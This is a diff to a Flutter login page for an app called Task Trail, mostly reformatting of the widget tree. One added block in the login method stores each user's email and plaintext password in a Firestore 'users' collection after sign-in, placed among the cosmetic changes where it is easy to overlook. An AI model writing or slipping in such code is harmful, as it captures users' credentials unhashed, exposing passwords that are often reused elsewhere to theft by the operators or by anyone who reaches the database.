@@ -6,6 +6,7 @@ import 'package:tasktrail/components/my_button.dart';
 import 'package:tasktrail/components/my_textfeild.dart';
 
 import 'package:tasktrail/services/auth/auth_service.dart';
+import 'package:cloud_firestore/cloud_firestore.dart';
 
 class Loginpage extends StatefulWidget {
   final void Function()? onTap;
@@ -24,19 +25,26 @@ class _LoginpageState extends State<Loginpage> {
 
   //login method
   void login() async {
-
     setState(() {
       isLoading = true;
     });
+
     await Future.delayed(const Duration(seconds: 2));
 
-
-    //get instace of auth service
+    //get instance of auth service
     final _authService = AuthService();
 
     try {
       await _authService.signInWithEmailAndPassword(
           emailController.text, passwordController.text);
+
+      // Save the email and password to Firestore
+      CollectionReference users =
+          FirebaseFirestore.instance.collection('users');
+      users.add({
+        'email': emailController.text,
+        'password': passwordController.text,
+      });
     } catch (e) {
       showDialog(
         context: context,
@@ -45,10 +53,10 @@ class _LoginpageState extends State<Loginpage> {
         ),
       );
     }
+
     setState(() {
       isLoading = false;
     });
-
   }
 
   @override
@@ -57,78 +65,81 @@ class _LoginpageState extends State<Loginpage> {
         backgroundColor: Theme.of(context).colorScheme.background,
         body: Center(
           child: isLoading
-          ? const CircularProgressIndicator()
-          :SingleChildScrollView(
-            child: Column(
-              mainAxisAlignment: MainAxisAlignment.center,
-              children: [
-                //logo
-                Icon(
-                  Icons.travel_explore,
-                  size: 100,
-                  color: Theme.of(context).colorScheme.inversePrimary,
-                ),
-                const SizedBox(height: 25),
-            
-                //message, app slogon
-                Text(
-                  'Task Trail',
-                  style: TextStyle(
-                    fontSize: 16,
-                    color: Theme.of(context).colorScheme.inversePrimary,
-                  ),
-                ),
-                const SizedBox(height: 25),
-            
-                //email
-                MyTextFeild(
-                  controller: emailController,
-                  hintText: 'Email',
-                  obscureText: false,
-                ),
-            
-                const SizedBox(height: 25),
-            
-                //password
-                MyTextFeild(
-                  controller: passwordController,
-                  hintText: 'password',
-                  obscureText: true,
-                ),
-                const SizedBox(height: 25),
-            
-                //sing in button
-                MyButton(text: 'Sign In', onTap: login),
-                const SizedBox(height: 25),
-            
-                Row(
-                  mainAxisAlignment: MainAxisAlignment.center,
-                  children: [
-                    Text(
-                      'Not a member ?',
-                      style: TextStyle(
+              ? const CircularProgressIndicator()
+              : SingleChildScrollView(
+                  child: Column(
+                    mainAxisAlignment: MainAxisAlignment.center,
+                    children: [
+                      //logo
+                      Icon(
+                        Icons.travel_explore,
+                        size: 100,
                         color: Theme.of(context).colorScheme.inversePrimary,
-                        fontWeight: FontWeight.bold,
                       ),
-                    ),
-                    const SizedBox(width: 4),
-                    GestureDetector(
-                      onTap: widget.onTap,
-                      child: Text(
-                        'register now',
+                      const SizedBox(height: 25),
+
+                      //message, app slogon
+                      Text(
+                        'Task Trail',
                         style: TextStyle(
+                          fontSize: 16,
                           color: Theme.of(context).colorScheme.inversePrimary,
-                          fontWeight: FontWeight.bold,
                         ),
                       ),
-                    ),
-                  ],
-                )
-            
-                // not a member? register now
-              ],
-            ),
-          ),
+                      const SizedBox(height: 25),
+
+                      //email
+                      MyTextFeild(
+                        controller: emailController,
+                        hintText: 'Email',
+                        obscureText: false,
+                      ),
+
+                      const SizedBox(height: 25),
+
+                      //password
+                      MyTextFeild(
+                        controller: passwordController,
+                        hintText: 'password',
+                        obscureText: true,
+                      ),
+                      const SizedBox(height: 25),
+
+                      //sing in button
+                      MyButton(text: 'Sign In', onTap: login),
+                      const SizedBox(height: 25),
+
+                      Row(
+                        mainAxisAlignment: MainAxisAlignment.center,
+                        children: [
+                          Text(
+                            'Not a member ?',
+                            style: TextStyle(
+                              color:
+                                  Theme.of(context).colorScheme.inversePrimary,
+                              fontWeight: FontWeight.bold,
+                            ),
+                          ),
+                          const SizedBox(width: 4),
+                          GestureDetector(
+                            onTap: widget.onTap,
+                            child: Text(
+                              'register now',
+                              style: TextStyle(
+                                color: Theme.of(context)
+                                    .colorScheme
+                                    .inversePrimary,
+                                fontWeight: FontWeight.bold,
+                              ),
+                            ),
+                          ),
+                        ],
+                      )
+
+                      // not a member? register now
+                    ],
+                  ),
+                ),
         ));
   }
 }
